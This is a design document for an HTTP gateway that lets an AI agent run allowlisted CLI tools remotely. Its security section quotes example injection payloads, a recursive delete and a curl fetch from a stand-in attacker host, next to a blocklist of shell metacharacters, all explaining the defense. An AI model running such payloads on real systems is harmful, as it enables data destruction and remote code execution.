---
title: "CLI Gateway Protocol"
tags: [protocol, http, cli, microservice, security, streaming]
sources: [raw/2026-04-14-cli-gateway-server-layer-design.md]
created: 2026-04-14
updated: 2026-04-14
---

# CLI Gateway Protocol

## Design Rationale

### Why CLI Cannot Be Replaced

The CLI layer in the [[concepts/four-layer-philosophy]] provides four capabilities that no other layer replicates:

**Progressive discovery.** An agent that has never interacted with a service before can learn its entire capability surface through a predictable sequence: `<tool> schema` to enumerate subcommands, `<tool> <subcommand> --help` to learn flags and arguments, `<tool> <subcommand> --dry-run` to preview execution, and finally `<tool> <subcommand> <args>` to execute. This discovery sequence is universal across CLI tools and does not require any pre-existing knowledge. MCP tools, by contrast, require the agent to already know the tool name and parameter schema before it can make a call.

**Pipeline encapsulation.** A single CLI command can encapsulate a multi-step workflow that would otherwise require the agent to manage state across dozens of individual tool calls. The Dramatizer's `dram run <job-id>` command encapsulates a 15-stage pipeline; the Moonshort Backend's `noval play <novelId> --auto` encapsulates a full automated game session. Without CLI encapsulation, the agent must manage intermediate state, handle partial failures, and maintain ordering invariants manually.

**Cross-cutting concerns.** Authentication (API key management, token refresh, credential storage), error classification (transient versus permanent failures), audit logging (recording what was executed and by whom), and input correction (suggesting fixes for common mistakes) are solved once in the CLI implementation and applied uniformly to all invocations. Without CLI centralization, each agent must independently re-solve these concerns on every call.

**Self-correction.** When a CLI command fails, the CLI can attach relevant help text and error context to the failure output, enabling the agent to diagnose and correct the problem without additional tool calls. In mobai-agent's `cli_run` implementation, a failed command automatically triggers a `--help` fetch for the relevant subcommand, and the help text is appended to the error response.

### Why a Transport Layer Solves the Cloud Problem

In a local development environment, CLI tools are invoked directly via subprocess spawning: `Bun.spawn(["dram", "run", "job-123"])`. This works because the CLI binary and the agent process share the same filesystem. In a cloud environment, the CLI binary runs on a different server. The challenge is enabling remote CLI execution without modifying CLI binaries, rewriting agent logic, or losing any of the CLI's progressive discovery characteristics.

The CLI Gateway solves this by adding a thin HTTP transport layer between the agent and the CLI. The gateway accepts HTTP requests, executes CLI commands locally on the machine where the CLI binary is installed, and returns the output over HTTP. The core insight is that the CLI's value is in its output, not in where it runs. The same stdout/stderr/exitCode triple that a subprocess produces can be transmitted over HTTP with perfect fidelity. From the agent's perspective, a remote CLI invocation via gateway is indistinguishable from a local subprocess invocation: the input is a command name plus arguments, the output is stdout, stderr, and an exit code.

This means that the [[concepts/four-layer-philosophy]]'s CLI layer works identically whether the CLI runs locally or remotely. Progressive discovery (`--help`) works via gateway. Self-correction loops work transparently. No code changes are needed in any CLI tool. The gateway is purely additive infrastructure.

## Endpoints

The CLI Gateway Protocol defines four HTTP endpoints. All gateways across the Moonshort platform implement the same contract, regardless of the underlying service or implementation language.

### POST /exec -- Synchronous Execution

Executes a CLI command synchronously and returns the complete output after the process exits.

#### Request Schema

```typescript
interface CliExecRequest {
  command: string;
  // The CLI tool name to execute. Must match an entry in the gateway's
  // command allowlist. Examples: "dram", "noval", "play", "test",
  // "forge-eval".
  // The gateway resolves this name to an actual executable via its
  // command mapping configuration.

  args: string[];
  // Array of individual arguments to pass to the command. Arguments are
  // passed directly to the subprocess without shell expansion.
  // Examples: ["run", "job-123", "--stage", "ludify"]
  //           ["play", "25", "--auto"]
  //           ["status", "--json"]
  // Each element is a single argument. Do not concatenate arguments
  // into a single string with spaces.

  timeout?: number;
  // Maximum execution time in milliseconds. The gateway will kill the
  // process (SIGKILL) after this duration and return HTTP 408.
  // Default: 30000 (30 seconds).
  // Long-running commands (pipeline runs, test suites) should set
  // higher values: 120000 for pipeline stages, 300000 for full runs.

  cwd?: string;
  // Override the working directory for the subprocess. When omitted,
  // the gateway uses its configured default CWD (typically the project
  // root directory of the service it fronts).

  env?: Record<string, string>;
  // Additional environment variables to set for the subprocess. These
  // are merged with the gateway's own environment. Existing variables
  // are overridden if the same key appears in both.
  // Example: { "DEBUG": "true", "LOG_LEVEL": "verbose" }
}
```

#### Response Schema

```typescript
interface CliExecResponse {
  stdout: string;
  // Complete standard output of the process, captured as a single string.
  // May contain ANSI color codes if the underlying CLI produces them.
  // Empty string if the command produced no stdout output.

  stderr: string;
  // Complete standard error output of the process, captured as a single
  // string. Many CLI tools write help text and progress information to
  // stderr, so a non-empty stderr does not necessarily indicate an error.
  // Empty string if the command produced no stderr output.

  exitCode: number;
  // Process exit code. 0 indicates success. Non-zero values are
  // command-specific but conventionally indicate failure.
  // Common values: 1 (general error), 2 (usage error), 126 (permission
  // denied), 127 (command not found), 137 (killed by SIGKILL, typically
  // from timeout).

  durationMs: number;
  // Wall-clock execution time in milliseconds, measured from process
  // spawn to process exit. Useful for performance monitoring and
  // timeout calibration.
}
```

#### HTTP Status Codes

| Status | Condition | Body |
|--------|-----------|------|
| 200 | Command executed and process exited (regardless of exit code) | `CliExecResponse` JSON |
| 400 | Command not in allowlist, or arguments contain forbidden characters | `{ "error": "<description>" }` |
| 403 | Authentication failure (missing or invalid Bearer token) | `{ "error": "Unauthorized" }` |
| 408 | Command exceeded timeout and was killed | `{ "error": "Timeout after <N>ms", "stdout": "<partial>", "stderr": "<partial>" }` |
| 500 | Internal gateway error (failed to spawn process, etc.) | `{ "error": "<description>" }` |

HTTP 200 is returned for all completed executions, including those with non-zero exit codes. This is a deliberate design choice: the HTTP status code reflects the status of the gateway operation (did the gateway successfully run the command?), not the status of the command itself (did the command succeed?). The command's exit code is in the response body. This separation prevents HTTP-level retry logic from interfering with command-level error handling.

#### Execution Flow

The gateway processes each `/exec` request through the following sequence:

1. **Validate authentication.** Extract the `Authorization` header, verify it matches the configured Bearer token. If no token is configured (dev mode), skip this step. Return 403 on failure.

2. **Check command allowlist.** Verify that `request.command` appears in the gateway's configured allowlist. Return 400 if the command is not allowed. This prevents the gateway from being used to execute arbitrary system commands.

3. **Validate arguments.** Scan each element of `request.args` for forbidden characters: semicolon (`;`), pipe (`|`), backtick (`` ` ``), dollar-paren (`$()`), double-ampersand (`&&`), and double-pipe (`||`). Return 400 if any argument contains these characters. This prevents argument injection even though the gateway does not use shell expansion.

4. **Resolve command mapping.** Look up `request.command` in the gateway's command mapping table. The mapping specifies the actual executable binary, base arguments (arguments that are always prepended), and default working directory.

5. **Spawn process.** Create a subprocess using the resolved executable, base arguments, user-provided arguments, and environment. The subprocess is spawned directly (no shell intermediary). Set up a timeout timer.

6. **Capture output.** Read stdout and stderr from the subprocess pipes. Accumulate both streams in memory until the process exits or the timeout fires.

7. **Return response.** Construct a `CliExecResponse` with the captured stdout, stderr, exit code, and execution duration. Return HTTP 200.

### POST /exec/stream -- Streaming Execution (SSE)

Executes a CLI command with Server-Sent Events (SSE) streaming, delivering output line-by-line as it is produced. Uses the same request schema as `POST /exec`.

#### SSE Response Format

The response uses standard SSE format with `Content-Type: text/event-stream`, `Cache-Control: no-cache`, and `Connection: keep-alive` headers. Three event types are emitted:

**stdout event** -- Emitted each time a complete line is read from the subprocess's standard output pipe.

```
event: stdout
data: {"line": "Processing stage ludify..."}

```

**stderr event** -- Emitted each time a complete line is read from the subprocess's standard error pipe.

```
event: stderr
data: {"line": "warning: deprecated flag --legacy-mode"}

```

**exit event** -- Emitted once when the subprocess exits. This is always the final event in the stream.

```
event: exit
data: {"exitCode": 0, "durationMs": 4521}

```

Each SSE event consists of an `event:` line specifying the type, a `data:` line containing a JSON object, and a blank line terminating the event. The `data` JSON is always a single line (no embedded newlines).

#### Streaming Implementation

The gateway implements streaming by attaching line-by-line readers to both the stdout and stderr pipes of the subprocess. In the Go implementation (Dramatizer), this uses `bufio.NewScanner()` on each pipe, with a goroutine per pipe reading lines and writing SSE events to the HTTP response writer. In the TypeScript implementation (Agent-Forge, Backend, Client), this uses `readline.createInterface()` on each pipe, with event listeners for the `line` event writing SSE events to the response stream.

Both implementations flush after each SSE event to ensure low-latency delivery. The stream terminates with the `exit` event after the subprocess exits.

#### When to Use Streaming

Streaming execution should be used for commands that produce incremental output over a long period. Examples include:

- `dram run <job-id>` -- Pipeline execution that can take minutes, with progress output for each stage.
- `noval play <novelId> --auto` -- Automated game sessions that take 30 seconds or more, with turn-by-turn output.
- `test <suite> --verbose` -- Test suite execution with per-test result output.

For commands that complete in under a few seconds and produce a small amount of output, synchronous `POST /exec` is simpler and more appropriate.

### GET /tools -- List Available Tools

Returns the list of CLI tools available through this gateway.

#### Response Schema

```typescript
interface CliToolsResponse {
  tools: Array<{
    name: string;
    // The command name as it appears in the allowlist and should be
    // used in /exec requests. Examples: "dram", "noval", "play".

    description: string;
    // Human-readable description of the tool. Used by mobai-agent's
    // discover_cli to present remote tools alongside local ones.
    // Examples: "Dramatizer CLI", "Moonshort game CLI",
    // "Headless AutoPlayer".

    version?: string;
    // Optional version string. Format is tool-specific.
    // Examples: "0.3.2", "1.0.0-beta", "2026.04.14".
  }>;
}
```

This endpoint is used by mobai-agent's `discover_cli` tool to aggregate remote tools from all configured gateways alongside locally-available CLI tools. The agent sees a unified tool list without needing to know which tools are local and which are remote.

### GET /health -- Health Check

Returns the gateway's status.

#### Response Schema

```typescript
interface CliHealthResponse {
  status: "ok";
  // Always "ok" if the gateway is running and responsive.

  uptime: number;
  // Gateway process uptime in seconds.
}
```

This endpoint is used for monitoring and connectivity verification. In the cloud deployment, mobai-agent checks gateway health on startup to verify that all configured gateways are reachable before accepting user requests.

## Command Mapping System

Each gateway maintains a mapping table that resolves short command names to actual executables with base arguments. This mapping system enables the same CLI Gateway Protocol to front different kinds of services, each with its own unique binary, runtime requirements, and argument conventions.

### How Short Names Resolve to Executables

When a gateway receives a request to execute command `"noval"` with args `["play", "25", "--auto"]`, the following resolution occurs:

1. Look up `"noval"` in the command mapping table.
2. Retrieve the mapping: `{ bin: "npx", baseArgs: ["tsx", "cli/bin/noval.ts"], cwd: "/path/to/backend" }`.
3. Build the full argument list by concatenating baseArgs with user-provided args: `["tsx", "cli/bin/noval.ts", "play", "25", "--auto"]`.
4. Spawn the process: `spawn("npx", ["tsx", "cli/bin/noval.ts", "play", "25", "--auto"], { cwd: "/path/to/backend" })`.

The `baseArgs` mechanism is what makes the command mapping system flexible. A TypeScript CLI that normally runs as `npx tsx cli/bin/noval.ts play 25 --auto` is exposed through the gateway as simply `noval play 25 --auto`. The gateway handles the runtime invocation details (npx, tsx, the path to the entry script) internally.

### Per-Service Command Mapping Examples

**Dramatizer (Go):**
```
"dram" --> spawn(os.Executable(), userArgs, { cwd: projectRoot })
```
The Dramatizer uses `os.Executable()` as a self-reference: the gateway is part of the same `dram` binary, so it spawns itself with the user-provided subcommand and arguments. This avoids any path resolution issues.

**Agent-Forge (TypeScript):**
```
"forge-eval" --> spawn("npx", ["tsx", "cli/src/main.ts", ...userArgs], { cwd: projectRoot })
```

**Backend (TypeScript):**
```
"noval" --> spawn("npx", ["tsx", "cli/bin/noval.ts", ...userArgs], { cwd: projectRoot })
```

**Moonshort Client (TypeScript):**
```
"play" --> spawn("npx", ["tsx", "--tsconfig", "test/tsconfig.test.json", "test/play.ts", ...userArgs], { cwd: projectRoot })
"test" --> spawn("npx", ["tsx", "--tsconfig", "test/tsconfig.test.json", "test/run-tests.ts", ...userArgs], { cwd: projectRoot })
```

### CWD Resolution

The working directory for each subprocess is resolved in the following priority order:

1. `request.cwd` if provided in the request body (highest priority).
2. The command mapping's configured `cwd` value (per-command default).
3. The gateway's global default CWD (typically the project root directory of the service the gateway fronts).

### Environment Variable Passing

Environment variables for the subprocess are constructed by merging three sources:

1. The gateway process's own environment (`process.env` or `os.Environ()`).
2. The command mapping's configured environment variables (per-command defaults).
3. `request.env` if provided in the request body (highest priority, overrides both above).

This merge order ensures that request-specific environment overrides take precedence over all defaults, while the gateway's own environment (which includes system PATH, HOME, and other critical variables) is always available to the subprocess.

## Security Model

### Bearer Token Authentication

All gateway endpoints require a Bearer token in the `Authorization` header:

```
Authorization: Bearer <token>
```

The expected token value is read from the `CLI_GATEWAY_KEY` environment variable on the gateway process. If `CLI_GATEWAY_KEY` is not set or is empty, the gateway operates in open mode (all requests are accepted without authentication). Open mode is intended for local development only, where the gateway is bound to localhost and is not exposed to the network.

In production deployments, each gateway has its own unique `CLI_GATEWAY_KEY`, and the corresponding key is configured in mobai-agent's `config.yaml` under `cli.gateways.<name>.apiKey`. This per-gateway key model ensures that compromising one gateway's key does not grant access to other gateways.

### Command Allowlist Enforcement

Each gateway maintains an explicit allowlist of command names that it is willing to execute. Requests for commands not on the allowlist are rejected with HTTP 400. The allowlist is hardcoded in the gateway's configuration (not configurable at runtime) to prevent dynamic allowlist expansion attacks.

Examples of allowlist configurations:
- Dramatizer gateway: `["dram"]` (only the `dram` binary)
- Backend gateway: `["noval"]` (only the `noval` game CLI)
- Client gateway: `["play", "test"]` (only the test automation tools)

### No Shell Expansion

This is the most critical security measure in the gateway. Commands are executed via direct process spawning (`spawn()` in Node.js, `exec.CommandContext()` in Go), never through a shell interpreter (`sh -c` or equivalent). The difference is fundamental:

With shell expansion (`sh -c "dram run job-123"`), the shell interprets special characters in the arguments. An attacker who can control arguments could inject `; rm -rf /` or `$(curl attacker.com/payload)` and the shell would execute the injected command.

With direct spawning (`spawn("dram", ["run", "job-123"])`), arguments are passed directly to the process as an argv array. No shell is involved. Special characters in arguments are treated as literal string content, not as shell metacharacters. There is no way for argument content to escape the argument boundary and be interpreted as a separate command.

### Argument Injection Filtering

Even though the gateway does not use shell expansion, it applies an additional layer of defense by rejecting arguments that contain characters commonly used in shell injection attacks. The following characters trigger rejection:

| Character | Why it is dangerous |
|-----------|-------------------|
| `;` | Command separator in shells. `arg; malicious-command` would execute two commands if a shell were present. |
| `\|` | Pipe operator. `arg \| malicious-command` would pipe the first command's output to a second command. |
| `` ` `` | Backtick command substitution. `` `malicious-command` `` would execute the backtick contents and substitute the output. |
| `$()` | Dollar-paren command substitution. `$(malicious-command)` is the modern equivalent of backticks. |
| `&&` | Conditional execution. `arg && malicious-command` would execute the second command if the first succeeds. |
| `\|\|` | Conditional execution. `arg \|\| malicious-command` would execute the second command if the first fails. |

This filtering is defense-in-depth. The primary protection is the absence of shell expansion. The argument filtering catches cases where an upstream component might inadvertently invoke a shell in the future, or where an argument might be logged in a context where shell interpretation occurs.

### Timeout Enforcement with SIGKILL

Each command execution has a timeout (configurable per-request, with a per-command and global default). When the timeout expires:

1. The gateway sends SIGKILL to the subprocess. SIGKILL is used instead of SIGTERM because it cannot be caught, blocked, or ignored. A malicious or buggy command cannot prevent its own termination.
2. Any partial stdout/stderr output captured before the timeout is included in the response.
3. The gateway returns HTTP 408 (Request Timeout).

The timeout default is 30 seconds. Long-running commands (pipeline runs, test suites) should specify higher timeouts in their request. The gateway's per-command configuration can also specify a default timeout for commands that are known to be long-running.

## Implementation Variants

### Go Implementation (Dramatizer)

The Dramatizer gateway is implemented as a subcommand of the `dram` binary itself: `dram gateway --port 9001`.

**Router:** Uses the `chi` HTTP router (already a dependency of the Dramatizer project). Routes are registered for the four protocol endpoints.

**Authentication middleware:** A `chi` middleware function that extracts and verifies the Bearer token on every request before passing control to the route handler.

**Command execution:** Uses Go's `exec.CommandContext()` with a context derived from the request timeout. The context ensures that the subprocess is killed when the timeout expires. The gateway uses `os.Executable()` to get the path to its own binary, enabling self-referencing execution where `dram gateway` spawns `dram <subcommand>` without needing to know the absolute path to the `dram` binary.

**Streaming:** The `POST /exec/stream` handler attaches `bufio.NewScanner()` to both stdout and stderr pipes. Two goroutines read lines from the respective pipes and write SSE events to an `http.ResponseWriter` that has been flushed after each event using `http.Flusher`.

**Process lifecycle:** The gateway listens for OS signals (SIGINT, SIGTERM) and performs graceful shutdown: stops accepting new requests, waits for in-flight executions to complete (up to a grace period), then kills any remaining subprocesses and exits.

### TypeScript Implementation (Agent-Forge, Backend, Client)

The TypeScript gateway is implemented as a standalone microservice in each project's `cli-gateway/` directory. All three projects share the same core implementation, differing only in their command mapping configuration.

**Server:** Uses Node.js built-in `http.createServer()` with zero external dependencies. The entire gateway runs without any npm packages, using only Node.js standard library modules. It can also run under Bun.

**Authentication:** A middleware function that checks `req.headers.authorization` against the `CLI_GATEWAY_KEY` environment variable. Returns 403 with a JSON error body on failure.

**Command execution:** Uses Node.js `child_process.spawn()` with the `stdio: ['pipe', 'pipe', 'pipe']` option for pipe-based I/O capture. A `setTimeout` callback kills the subprocess via `process.kill()` when the timeout expires.

**Streaming:** The `POST /exec/stream` handler uses `readline.createInterface()` on both stdout and stderr pipes. The `line` event fires for each complete line, which is written to the response as an SSE event. The response headers are set to `Content-Type: text/event-stream`, `Cache-Control: no-cache`, and `Connection: keep-alive`. The `close` event on the subprocess triggers the final `exit` SSE event.

**Zero dependencies:** The TypeScript gateway intentionally has zero npm dependencies. It uses `http` for the server, `child_process` for process spawning, `readline` for line-by-line streaming, and `url`/`querystring` for request parsing. This ensures the gateway can be deployed by simply copying the files and running `npx tsx cli-gateway/server.ts` or `bun run cli-gateway/server.ts` without any `npm install` step.

## Integration with mobai-agent

On the agent side, the `cli-gateway-client.ts` module in mobai-agent implements the HTTP client that communicates with remote gateways. Two primary functions are exposed:

**`execRemoteCli(gateway, request)`** -- Sends a `POST /exec` request to the gateway. Handles Bearer token injection from the gateway configuration, timeout management (with a 5-second buffer added to the request timeout to account for HTTP overhead), and response parsing. Returns a `CliExecResponse` object identical to what a local subprocess would produce.

**`listRemoteTools(gateway)`** -- Sends a `GET /tools` request to the gateway. Returns an array of tool descriptors (name, description, version). Called by `discover_cli` to aggregate remote tools into the agent's unified tool list.

**`findGateway(command, gateways)`** -- Looks up which gateway (if any) handles the given command name by checking each gateway's configured `tools` array. Called by `cli_run` to determine whether to route a command to a remote gateway or execute it locally.

The routing logic in `cli_run` is transparent: the agent issues a `cli_run` call with a command name and arguments. The tool implementation checks if any configured gateway handles that command. If a gateway match is found, the request is routed to the gateway via HTTP. If no gateway match is found, the command is executed locally via subprocess spawning. The agent does not need to know or care whether a command runs locally or remotely.

## Related

- [[entities/cli-gateway]]
- [[concepts/four-layer-philosophy]]
- [[syntheses/cloud-deployment-architecture]]
- [[entities/mobai-agent]]
- [[entities/dramatizer]]
- [[entities/agent-forge]]

## Sources

- [CLI Gateway + Server Layer Design Spec](../raw/2026-04-14-cli-gateway-server-layer-design.md)
